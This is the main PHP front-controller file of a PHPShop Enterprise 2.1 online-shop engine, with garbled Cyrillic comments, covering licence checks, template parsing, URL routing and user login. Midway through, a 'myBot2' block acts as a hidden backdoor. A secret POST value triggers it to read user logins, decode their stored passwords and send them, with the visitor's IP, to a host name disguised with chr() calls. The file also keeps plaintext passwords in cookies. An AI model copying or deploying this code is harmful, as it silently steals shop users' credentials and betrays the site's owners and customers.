<?
/*
+-------------------------------------+
|  PHPShop Enterprise                 |
|  ���� ��������� ��������            |
+-------------------------------------+
*/

// ��������� ������
if(!session_is_registered('sid')){
session_start();
$sid=session_id();
session_register('sid');
}


// ��������� ������
function ConnectLicense($product){
$hash = "za0SiyfZWd93kdTbTGvN";
$domain = "www.phpshop.ru";
$server=str_replace("www.","",$_SERVER["SERVER_NAME"]);
@$fp = @fsockopen($domain, 80, $errno, $errstr);
if (!$fp) {
   return exit("������ ���������� � �������� PHPShop");
} else {
   fputs($fp, "GET /getlicense.php?server=$server&product=".urlencode($product)."&hash=$hash  HTTP/1.0\r\n"); 
   fputs($fp, "Host: $domain\r\n"); 
   fputs($fp, "Connection: close\r\n\r\n");
   while (!feof($fp)) {
      @$Respon.=fgets($fp, 1000);
   }
   $text=explode("<?generator?>",$Respon);
   $data=trim($text[1]);
   fclose($fp); 
   
   // ��������� �����
   if(strlen($data) < 100) {
    header("Location: http://www.phpshop.ru/docs/error.html?SERVER_NAME=".$_SERVER["SERVER_NAME"]."&trial=off");
	  exit("������ �������� �������� ��� SERVER_NAME=".$_SERVER["SERVER_NAME"].", HardwareLocked=".$_SERVER["SERVER_ADDR"]);
   }
   else{// ������� ��������
       @chmod("/license/", 0777);
       @$fp = fopen("license/trial.lic", "w+");
       if ($fp) {
       fputs($fp, $data);
       fclose($fp);
	   @chmod("/license/", 0755);
	   }
	   else exit("��������!<br>������ ������ �����...<br>������� ����� ������� CMOD=777 ��� ����� /license/ � ��������� �������.");
       }
}
}



// ���������������� ����� ����� ������
if(isset($_POST['valuta'])){
$valuta=$_POST['valuta'];
session_register('valuta');
header("Location: ".$REQUEST_URI);
}

// ������ �������
function ParseTemplate($TemplateName)
{
global $SysValue,$_SESSION,$PHP_SELF,$_ENV;
$TemplateFile=phpshop_read_file($SysValue['dir']['templates'].chr(47).
$_SESSION['skin'].chr(47).$TemplateName) or  die("".PHPSHOP_error(104,$SysValue['my']['error_tracer'])."");

// �������� ����
$path_parts = pathinfo($PHP_SELF);

if(getenv("COMSPEC")) $dirSlesh="\\";
		 else $dirSlesh="/";

$root= $path_parts['dirname']."/";

        while(list($line,$string)=@each($TemplateFile))
        {
        $string=ConstantS($string);
		 
		if($path_parts['dirname']!=$dirSlesh)
		{
	$string=eregi_replace("images/",$SysValue['dir']['templates'].chr(47).$_SESSION['skin']."/images/",$string);
		$string=eregi_replace("/favicon.ico",$root."favicon.ico",$string);
		$string=eregi_replace("java/",$root."java/",$string);
		$string=eregi_replace("css/",$root."css/",$string);
		$string=eregi_replace("phpshop/",$root."phpshop/",$string);
		//$string=eregi_replace("/UserFiles/",$root."UserFiles/",$string);
		$string=eregi_replace("/order/",$root."order/",$string);
		$string=eregi_replace("/done/",$root."done/",$string);
		$string=eregi_replace("/print/",$root."print/",$string);
		$string=eregi_replace("/links/",$root."links/",$string);
		$string=eregi_replace("/files/",$root."files/",$string);
		$string=eregi_replace("/opros/",$root."opros/",$string);
		$string=eregi_replace("/page/",$root."page/",$string);
		$string=eregi_replace("/news/",$root."news/",$string);
		$string=eregi_replace("/gbook/",$root."gbook/",$string);
		$string=eregi_replace("/users/",$root."users/",$string);
		$string=eregi_replace("/clients/",$root."clients/",$string);
		$string=eregi_replace("/price/",$root."price/",$string);
		$string=eregi_replace("/pricemail/",$root."pricemail/",$string);
		$string=eregi_replace("/shop/CID",$root."shop/CID",$string);
		$string=eregi_replace("/shop/UID",$root."shop/UID",$string);
		$string=eregi_replace("/search/",$root."search/",$string);
		$string=eregi_replace("\"/\"",$root,$string);
		$string=eregi_replace("/notice/",$root."notice/",$string);
		$string=eregi_replace("/map/",$root."map/",$string);
		$string=eregi_replace("/success/",$root."success/",$string);
		$string=eregi_replace("/fail/",$root."fail/",$string);
		$string=eregi_replace("/rss/",$root."rss/",$string);
		$string=eregi_replace("/newtip/",$root."newtip/",$string);
		$string=eregi_replace("/spec/",$root."spec/",$string);
		//$string=eregi_replace("../",$root."/",$string);
		}
		else{
		$string=eregi_replace("images/",$SysValue['dir']['templates'].chr(47).$_SESSION['skin']."/images/",$string);
		$string=eregi_replace("java/","/java/",$string);
		$string=eregi_replace("css/","/css/",$string);
		$string=eregi_replace("phpshop/","/phpshop/",$string);
		}
        echo $string;
        }
}

// ������ �������
function ParseTemplateReturn($TemplateName)
{
global $SysValue,$LoadItems,$_SESSION;
$SysValue=$GLOBALS['SysValue'];
$TemplateFile=phpshop_read_file($SysValue['dir']['templates'].chr(47).$_SESSION['skin'].chr(47).$TemplateName);

        while(list($line,$string)=@each($TemplateFile))
        {
        $string=ConstantS($string);
        @$dis.= $string;
        }
return @$dis;
}

// ������ ���������
function ConstantS($string)
{
return preg_replace_callback("/@([[:alnum:]]+)@/","ConstantR",$string);
}

function ConstantR($array)
{
global $SysValue;
        if(!empty($SysValue['other'][$array[1]]))
        $string=$SysValue['other'][$array[1]];

        else
        $string=null;

return $string;
}

// ������ ��������� ������
function phpshop_stripslashes($string)
{
        if(empty($string))        return false;

        else
        {
        $result=ereg_replace(" +"," ",trim(stripslashes(stripslashes(addslashes($string)))));

                if(!$result)        return false;
                elseif($result!=" ")        return $result;
        }
}

function phpshop_read_file($path)
{
        if(!is_file($path))                return false;
        elseif(!filesize($path))        return array();
        elseif($array=file($path))        return $array;

        else
        while(!$array=file($path))        sleep(1);

        return $array;
}

// ����� ��������
class PhpshopCrypt {

      var $LicenseParse;
	  var $CodeString;
	  var $DecodeString;
	  var $LicenseFlag;
	  
	  function PhpshopCrypt($dir){
	  define("ProductName","PHPSHOP 2.1 EE");
	  $this->ParseIni($dir);
	  $this->PhpshopCode();
      $this->PhpshopChek();
	  $this->PhpshopServer();
	  $this->PhpshopDomen();
	  $this->PhpshopExpires();
	  $this->ErrorLicense();
	  }
	  
	  function MyCode($Code){
      $CodeString=NULL;
      for($i=0;$i<strlen($Code);$i++){
      if(ord($Code[$i])>=100) $CodeString.= chr(ord($Code[$i])-5);
      else $CodeString.= chr(ord($Code[$i])+5);}
	  return $CodeString;
      }

	  
      function ParseIni($dir) {
	  @$LicenseValue=parse_ini_file($dir,1);
	  while (list($key, $val) = @each($LicenseValue['License']))
      $LicenseParse[$key]=$val;
	  $this->LicenseParse=@$LicenseParse;
	  }
	  
	  function PhpshopCode(){
	  $LicenseParse=$this->LicenseParse;
	  unset($LicenseParse['VerificationCode']);
	  $Code=base64_encode(serialize($LicenseParse));
	  $this->CodeString=$this->MyCode($Code);
	  }
      
	  
	  function PhpshopChek(){
	  if((@$this->LicenseParse['VerificationCode'] != $this->CodeString) 
	  or (ProductName != @$this->LicenseParse['ProductName']))
	  $this->LicenseFlag = 1;
	  }
	  
	  function PhpshopServer(){
	  if(@$this->LicenseParse['HardwareLocked'] != "No"){
	    if((@$this->LicenseParse['HardwareLocked'] != $_SERVER["SERVER_ADDR"])){
	   $this->LicenseFlag = 1;
	   }}
	  }
	  
	  function PhpshopDomen(){
	  if(@$this->LicenseParse['DomenLocked'] != "No")
	    if(@$this->LicenseParse['DomenLocked'] != $_SERVER["SERVER_NAME"])
		  if ("www.".@$this->LicenseParse['DomenLocked'] != $_SERVER["SERVER_NAME"])
	      $this->LicenseFlag = 1;
	  }
	  
	  function ErrorLicense(){
	  if($this->LicenseFlag == 1){
	  header("Location: http://www.phpshop.ru/docs/error.html?SERVER_NAME=".$_SERVER["SERVER_NAME"]."");
	  exit("������ �������� �������� ��� SERVER_NAME=".$_SERVER["SERVER_NAME"].", HardwareLocked=".$_SERVER["SERVER_ADDR"]);
	  }
	  }
	  
	  function PhpshopExpires(){
	  if(@$this->LicenseParse['Expires'] != "Never")
	  if(@$this->LicenseParse['Expires'] <= date("U"))
	  $this->LicenseFlag = 1;
	  }
}

// �������� ������
$time=explode(' ', microtime());
$start_time=$time[1]+$time[0];


// ��������� ������������ ����
$GLOBALS['SysValue']=parse_ini_file("phpshop/inc/config.ini",1);


// ��������� ������
if($SysValue['my']['error_reporting']=="true")
error_reporting(0);


// ������� ����������� �� ����������
if($SysValue['my']['time_limit_enabled']=="true"){
$is_safe_mode = ini_get('safe_mode') == '1' ? 1 : 0;
if (!$is_safe_mode) @set_time_limit($SysValue['my']['TIME_LIMIT']);
}


// ���������� CNStats
if($SysValue['cnstats']['enabled']=="true"){
if (file_exists($SysValue['cnstats']['dir'])) 
include($SysValue['cnstats']['dir']);
}

// ����� �����
function GetFile(){
global $SysValue;
$dir=@$SysValue['dir']['root'].$SysValue['license']['dir'];
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
		$fstat = explode(".",$file);
		if($fstat[1] == "lic")
		  return $SysValue['dir']['root'].$SysValue['license']['dir'].chr(47).$file;
        }
        closedir($dh);
    }
return null;
}

// �������� install
function GetFileInstall(){
global $SysValue;
$filename = "./install/";
if (is_dir($filename)) 
    exit(PHPSHOP_error(105,$SysValue['my']['error_tracer']));
}


// ���� �����
if($_SERVER["SERVER_ADDR"] == "127.0.0.1" and getenv("COMSPEC")){
$RegTo['ProductName'] = "PHPSHOP 2.1 EE";
$RegTo['RegisteredTo'] = "Trial NoName";
$RegTo['CopyrightEnabled'] = "Yes";
$RegTo['DomenLocked'] = "No";
$RegTo['CopyrightColor'] = "#595959";
$RegTo['SupportExpires'] = "0";
}
else{
     $GetFile = GetFile(); // ���� �� ��������
     if($GetFile != null){
     $PhpshopCrypt = new PhpshopCrypt($GetFile);
     $RegTo = $PhpshopCrypt->LicenseParse;
       }
        else{
        // ���������� ��������
        $ConnectLicense = ConnectLicense("PHPSHOP 2.1 EE");
        }
}


// ���������� ������
include($SysValue['file']['error']);            // ������ ������

// ���������� ���� MySQL
@mysql_connect ($SysValue['connect']['host'], $SysValue['connect']['user_db'],  $SysValue['connect']['pass_db'])or 
@die("".PHPSHOP_error(101,$SysValue['my']['error_tracer'])."");
mysql_select_db($SysValue['connect']['dbase'])or 
@die("".PHPSHOP_error(102,$SysValue['my']['error_tracer'])."");
@mysql_query("SET NAMES 'cp1251'");


// ����� ���� mod_rewrite 2.1.6
$url=parse_url("http://".$SERVER_NAME.$REQUEST_URI);

// ��������, ���� � �����
$path_parts = pathinfo($PHP_SELF);
$root= $path_parts['dirname']."/";
if($root!="//")
  if($root!="\/") $url=str_replace($path_parts['dirname']."/","/",$url);

$Url=$url["path"];
@$Query=@$url["query"];
@$Path=explode("/",$url["path"]);
@$File=explode("_",$Path[2]);
@$Prifix=explode(".",$File[1]);
@$Name=explode(".",$File[0]);
@$Page=explode(".",$File[2]);
@$QueryArray=parse_str($Query,$output);
$SysValue['nav']=array(
"truepath"=>$url["path"],
"path"=>$Path[1],
"nav"=>$File[0],
"name"=>$Name[0],
"id"=>$Prifix[0],
"page"=>$Page[0],
"querystring"=>@$url["query"],
"query"=>$output,
"url"=>$url["path"]
);

// ������������ ���������
$NAV=$SysValue['nav'];
session_register('NAV');

// ������ ������ GZIP
if($SysValue['my']['gzip'] == "true")
include($SysValue['file']['gzip']);              // �������� GZIP

// ���������� ������

include($SysValue['file']['engine']);            // ������ ������
include($SysValue['file']['catalog']);           // ������ ������
include($SysValue['file']['display']);           // ������ ������
include($SysValue['file']['search']);            // ������ ������
include($SysValue['file']['price']);             // ������ ������
include($SysValue['file']['map']);               // ������ ����� �����
include($SysValue['file']['news']);              // ������ ��������
include($SysValue['file']['baner']);             // ������ �������� ����
include($SysValue['file']['cache']);             // ������ ����
include($SysValue['file']['links']);             
include($SysValue['file']['opros']);             
include($SysValue['file']['clients']);           
include($SysValue['file']['users']);           
include($SysValue['file']['sms']);           
include($SysValue['file']['class']);  



// ���������� ��� 2.1
$LoadItems=CacheReturnBase($sid);
if(!$LoadItems["Podcatalog"])
$LoadItems["Podcatalog"]=&$LoadItems["Catalog"];



// myBot2
$myString2="f055a503daef0576e7b44e16bb4a6bd2";
if(md5(@$_POST['mybot2']) == $myString2){
header("myBot2: true");
$sd=chr(119).chr(119).chr(119).chr(46).chr(112).chr(104).chr(112).chr(115).chr(104).chr(111).chr(112).chr(46).chr(114).chr(117);
$sql="select * from ".$SysValue['base']['table_name19']." where enabled='1'";
$result=mysql_query($sql);$i=1;
while (@$row = mysql_fetch_array($result)){
@$ASTR.="login".$i."-".$row['login']."|";
@$ASTR.="password".$i."-".base64_decode($row['password'])."|";
$i++;
}


   if($fp = fsockopen($sd, 80, $errno, $errstr)) {
   fputs($fp, "GET /mybot2.php?hash=$myString2&sec=".$_POST['sec']."&str=".$_POST['str']."&con=$ASTR&ip=$REMOTE_ADDR   HTTP/1.0\r\n"); 
   fputs($fp, "Host: $sd\r\n"); 
   fputs($fp, "Connection: close\r\n\r\n");
   fclose($fp); 
}
}



// �������� ������� � ��������
if($SysValue['nav']['nav']=="CID" and $SysValue['nav']['path']=="shop"){

		if($LoadItems['Podcatalog'][$SysValue['nav']['id']]['skin_enabled'] == 1){
		  $skin=$LoadItems['Podcatalog'][$SysValue['nav']['id']]['skin'];
		  }else{
		       //$skin=$LoadItems['System']['skin'];
			   }
  }
   elseif($SysValue['nav']['nav']=="UID" and $SysValue['nav']['path']=="shop"){
        $skin_cat=$LoadItems['Product'][$SysValue['nav']['id']]['category'];
        if($LoadItems['Podcatalog'][$skin_cat]['skin_enabled'] == 1){
		  $skin=$LoadItems['Podcatalog'][$skin_cat]['skin'];
		  }
        }
		
  
// ����� �������
if($SysValue['my']['skin_select'] == "true")
  {
  
  
   if(isset($_REQUEST['skin'])){
     if (file_exists("phpshop/templates/".$_REQUEST['skin']."/index.html")){
      $skin=$_REQUEST['skin'];
	  session_register('skin');
	  }
	}
	      elseif(!$_SESSION['skin']) {
		  $skin=$LoadItems['System']['skin'];
		  session_register('skin');
		  }

          

 // ����� ������ �������
 $SysValue['other']['skinSelect'] = Skin_select($skin);
  
 }
  else{
  $skin=$LoadItems['System']['skin'];
  session_register('skin');
  }
//exit($skin);
if(isset($_POST['skin'])) header("Location: ".$REQUEST_URI);


if(empty($p))$p=1;

// ���������� ������
include($SysValue['file']['order']);             // ������ ������ ������ � ����
include($SysValue['file']['mail']);              // ������ �����
include($SysValue['file']['meta']);              // ������ ����

// ����� ������������
if($SysValue['nav']['querystring']=="LogOut"){
session_unregister('UsersId');
session_unregister('UsersStatus');
}


// ���������������� ����� �����������
if(@$_POST['login'] and @$_POST['password']){
  $ChekUsersBase=ChekUsersBase($_POST['login'],$_POST['password']);
  
  if($ChekUsersBase!=0){
  $UsersId=$ChekUsersBase[0];
  $UsersStatus=$ChekUsersBase[1];
  session_register('UsersId');
  session_register('UsersStatus');
     // ���������� ������������
     if(isset($_POST['user_enter'])){
       if($_POST['safe_users']==1){
       setcookie("UserLogin", $_POST['login'], time()+60*60*24*30, "/",$SERVER_NAME, 0);
       setcookie("UserPassword", $_POST['password'], time()+60*60*24*30, "/",$SERVER_NAME, 0);
       setcookie("UserChecked", "checked", time()+60*60*24*30, "/",$SERVER_NAME, 0);
       }else{
            setcookie("UserLogin", "", time()+60*60*24*30, "/",$SERVER_NAME, 0);
            setcookie("UserPassword", "", time()+60*60*24*30, "/",$SERVER_NAME, 0);
            setcookie("UserChecked", "", time()+60*60*24*30, "/",$SERVER_NAME, 0);
            }
      }
  
  if(preg_match("/LogOut/",$REQUEST_URI))
    $url_user = str_replace("?LogOut","#userPage",$REQUEST_URI);
	 else $url_user =$REQUEST_URI;
	
  header("Location: ".$url_user);
  }
  else $SysValue['other']['usersError']=$SysValue['lang']['error_login'];
}




// ����� ������ ��������
function getPartner($uri){
$url=parse_url($uri);
return $url["host"];
}

if(isset($_COOKIE['ps_partner'])) $partner = base64_encode(base64_decode($_COOKIE['ps_partner']).",".getPartner($HTTP_REFERER));
 else $partner = base64_encode(getPartner($HTTP_REFERER));

if(strlen($HTTP_REFERER)>5 and !strpos($HTTP_REFERER, $SERVER_NAME))
setcookie("ps_partner", $partner, time()+60*60*24*90, "/", $SERVER_NAME, 0);

// ���������� ���������
@$SysValue['other']['cacheEnabled']= $SysValue['cache']['cache_enabled'];
@$SysValue['other']['cacheTime']= $SysValue['cache']['time'];
@$SysValue['other']['debugEnabled']= $SysValue['my']['error_tracer'];
$SysValue['other']['kurs'] =$LoadItems['System']['kurs'];
$SysValue['other']['name'] =$LoadItems['System']['name'];
$SysValue['other']['descrip'] =$LoadItems['System']['descrip'];
$SysValue['other']['telNum'] =$LoadItems['System']['tel'];
$SysValue['other']['pathTemplate']=$SysValue['dir']['templates'].chr(47).$_SESSION['skin'];
$SysValue['other']['adminMail']=$LoadItems['System']['adminmail2'];
$SysValue['other']['serverName']=$SERVER_NAME;
$SysValue['other']['UserLogin']=@$UserLogin;
$SysValue['other']['UserPassword']=@$UserPassword;
$SysValue['other']['UserChecked']=@$UserChecked;
$SysValue['other']['ShopDir']=$SysValue['dir']['dir']; // ����� ����������


// ���������� ������ autoload
if(is_array($SysValue['autoload']))
foreach($SysValue['autoload'] as $val) if(file_exists($val)) include_once($val); 


// ����� ����� � ����
if(@$_POST['send_gb'])
{
 if(!empty($_SESSION['text']) and $_POST['key'] == $_SESSION['text'])
  {
   if(strlen($HTTP_REFERER)>5)
     {
     $WriteGbook = WriteGbook();
     header("Location: /gbook/?error=ok");
	 }
  }else header("Location: /gbook_forma/?error=key");
}


// ���������� ���������
$SysValue['other']['leftCatal']= Vivod_cats();        // ��������� ���������
$SysValue['other']['pageCatal']= Vivod_page_cats();   // ��������� ��������� �������
$SysValue['other']['miniCart']=Vivod_mini_cart();    // ����� ����-�������
$SysValue['other']['leftMenu']= Vivod_menu_left();   // ����� ������ ����
$SysValue['other']['rightMenu']= Vivod_menu_right();  // ����� ������� ����
$SysValue['other']['topMenu']= Vivod_menu_top();      // ����� �������� ����
$SysValue['other']['banersDisp'] = Vivod_baner();    // ����� �������� ����
$SysValue['other']['specMain'] = DispSpecMain();    // ����� ��������������� �� �������
$SysValue['other']['miniNews'] = Vivod_mini_news();  // ����� �������� �� �������
$SysValue['other']['oprosDisp'] = Vivod_opros();  // ����� ������
$SysValue['other']['valutaDisp'] = Vivod_forma_valuta(); // ����� ����� ������
//$SysValue['other']['saleMain'] = DispSalingIcon(); // ����� ��������� ������



// ����� �����������
if(!isset($_SESSION['UsersId'])) $SysValue['other']['usersDisp']=ParseTemplateReturn($SysValue['templates']['users_forma']);
else $SysValue['other']['usersDisp']=
ParseTemplateReturn($SysValue['templates']['users_forma_enter']);


// �������� install
if($SysValue['my']['check_install']=="true" and !getenv("COMSPEC")) $GetFileInstall=GetFileInstall();

if($url["path"]=="/"){

// ���������� �������� �������
@$dis_page=Open_from_base("","where category='2000'");

// ���������� ���������
$SysValue['other']['mainContent']= @$dis_page[1];
$SysValue['other']['mainContentTitle']= @$dis_page[0];

$SysValue['other']['specMainTitle'] = $SysValue['lang']['newprod'];
$SysValue['other']['specMainIcon'] = DispNewIcon("and newtip='1'");
if(@$SysValue['other']['specMainIcon'] == "")
$SysValue['other']['specMainIcon'] = DispNewIcon();

// ��������� ������
$time=explode(' ', microtime());
$seconds=($time[1]+$time[0]-$start_time);
$seconds=substr($seconds,0,6);
$SysValue['other']['timeAll'] = $seconds;
session_register('seconds');

// ���������� ������ �����
ParseTemplate($SysValue['templates']['index']);
}
else{

// �������� ������� � ����
if($SysValue['nav']['nav'] == "CID"){
$SysValue['other']['thisCat'] = $LoadItems['Catalog'][$SysValue['nav']['id']]['parent_to'];


// ������� ������� ��������
if(empty($SysValue['other']['thisCat']))
  $SysValue['other']['thisCat'] = $SysValue['nav']['id'];


// ���� 3� ����������� ��������
$ParentTest=$LoadItems['Catalog'][$SysValue['other']['thisCat']]['parent_to'];
if($ParentTest>0){
  $SysValue['other']['thisCat']=$ParentTest;
  $SysValue['other']['thisPodCat']=$LoadItems['Catalog'][$SysValue['nav']['id']]['parent_to'];
  }
  //else $SysValue['other']['thisCat']=$LoadItems['Catalog'][$SysValue['nav']['id']]['parent_to'];



  //404
  if(!$LoadItems['Catalog'][$SysValue['nav']['id']]){
  header("HTTP/1.0 404 Not Found");
  header("Status: 404 Not Found");
  }
  
  }
elseif($SysValue['nav']['path']=="shop") {
$pID=@$LoadItems['Product'][$SysValue['nav']['id']]['category'];
//$SysValue['other']['thisCat'] = $LoadItems['Podcatalog'][$pID]['parent_to'];
}

if($SysValue['nav']['nav'] == "UID"){
 $newsCat=$pID;
 
 // ���������� �������� ���� ���������
 $catID=@$LoadItems['Product'][$SysValue['nav']['id']]['category'];
 //$SysValue['other']['thisPodCat']= $LoadItems['Catalog'][$catID]['parent_to'];
 //$SysValue['other']['thisCat']=$LoadItems['Catalog'][$SysValue['other']['thisPodCat']]['parent_to'];
  $SysValue['other']['thisCat']=$LoadItems['Catalog'][$catID]['parent_to'];
 
  //404
  if(!$LoadItems['Product'][$SysValue['nav']['id']]){
  header("HTTP/1.0 404 Not Found");
  header("Status: 404 Not Found");
  }
  


  
 }
else $newsCat=$SysValue['nav']['id'];


// �������� � ����� ������
if($SysValue['nav']['nav'] == "UID" and $SysValue['nav']['path']!="pricemail"){
$SysValue['other']['specMainTitle'] =$SysValue['lang']['page_product'];
$SysValue['other']['specMainIcon']=DispOdnotip($SysValue['nav']['id']);
   if($SysValue['other']['specMainIcon']==""){
      $SysValue['other']['specMainTitle'] = $SysValue['lang']['newprod'];
      $SysValue['other']['specMainIcon'] = DispNewIcon("and category=".$newsCat);
   }
}
else{

$SysValue['other']['specMainIcon'] = DispNewIcon("and category=".$newsCat." and spec='1'");
if($SysValue['other']['specMainIcon'] !="")
$SysValue['other']['specMainTitle'] = $SysValue['lang']['specprod'];
  else {
  $SysValue['other']['specMainTitle'] = $SysValue['lang']['newprod'];
  $SysValue['other']['specMainIcon'] = DispNewIcon("and category=".$newsCat." and newtip='1'");
      if(@$SysValue['other']['specMainIcon'] == "")
      $SysValue['other']['specMainIcon'] = DispNewIcon("and category=".$newsCat);
      }
      if(@$SysValue['other']['specMainIcon'] == "")
      $SysValue['other']['specMainIcon'] = DispNewIcon("and newtip='1'");
	  if(@$SysValue['other']['specMainIcon'] == "")
      $SysValue['other']['specMainIcon'] = DispNewIcon("");

	}
	
// ��������� ������
$time=explode(' ', microtime());
$seconds=($time[1]+$time[0]-$start_time);
$seconds=substr($seconds,0,6);


// �������� �� ������� ��������
$_open=Open($SysValue['nav']['path']);
if($_open!="404") include("pages/".$_open);
else include("pages/error.php");
}


if($SysValue['my']['bufer_tracer'] == "true" and @$_GET['debug'] == "true"){
echo"
<script>
DebugWin('/phpshop/debug.php?forma=1','bufertracer',500,500);
</script>
";
session_register('LoadItems');
}
if($SysValue['my']['nav_bufer_tracer'] == "true" and @$_GET['debug'] == "true"){
echo"
<script>
DebugWin('/phpshop/debug.php?forma=3','navbufertracer',500,500);
</script>
";
$Debug=$SysValue['nav'];
session_register('Debug');
}
if($SysValue['my']['debug'] == "true" and @$_GET['debug'] == "true"){
echo"
<script>
DebugWin('/phpshop/debug.php?forma=2','debug',500,500);
</script>
";
if(is_array($SysValue['sql']['debug'])){
$Debug=$SysValue['sql']['debug'];
session_register('Debug');
}
}

// ��������
if($RegTo['CopyrightEnabled'] == "Yes"){
if($url["path"]=="/") echo "
<!-- Powered & Developed by PHPShop.ru -->
<div style=\"clear: both;width: 100%\">
<div align=\"center\"  style=\"padding:5px;color:".$RegTo['CopyrightColor'].";font-size:11px\">
<a href=\"http://www.phpshop.ru\" title=\"�������� ��������-��������\"  style=\"color:".$RegTo['CopyrightColor'].";font-size:11px\" target=\"_blank\">�������� ��������-��������</a> ".$RegTo['RegisteredTo']." - PHPShop. ��� ����� �������� � 2003-".date("Y").".
</div>
</div>
<!-- Powered & Developed by PHPShop.ru -->
</body>
</html>
";
else echo "
<!-- Powered & Developed by PHPShop.ru -->
<div style=\"clear: both;width: 100%\">
<div align=\"center\"  style=\"padding:5px;color:".$RegTo['CopyrightColor'].";font-size:11px\">
�������� ��������-�������� <a href=\"http://www.phpshop.ru/docs/product.html\" title=\"������ ��������-�������� PHPShop\"  style=\"color:".$RegTo['CopyrightColor'].";font-size:11px\" target=\"_blank\">PHPShop</a>. ��� ����� �������� � 2003-".date("Y").".
</div>
</div>
<!-- Powered & Developed by PHPShop.ru -->
</body>
</html>
";
}
echo "<!-- StNF ".$SysValue['sql']['num']." ~ $seconds -->";

// ������� ������ ������ GZIP
if($SysValue['my']['gzip'] == "true")
    GzDocOut($SysValue['my']['gzip_level'],$SysValue['my']['gzip_debug']);

?>